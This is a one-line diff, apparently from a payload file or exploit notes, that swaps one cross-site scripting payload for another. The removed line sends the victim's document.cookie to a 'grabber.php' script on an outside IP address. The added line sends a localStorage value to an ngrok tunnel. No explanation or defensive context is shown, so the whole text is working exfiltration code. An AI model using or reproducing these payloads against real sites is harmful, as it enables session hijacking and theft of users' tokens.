@@ -1,1 +1,1 @@
-document.location='http://52.6.139.10:30000/grabber.php?c='+document.cookie
+document.location='https://d714-187-85-166-25.ngrok.io/?c='+localStorage.getItem('Userundefined')
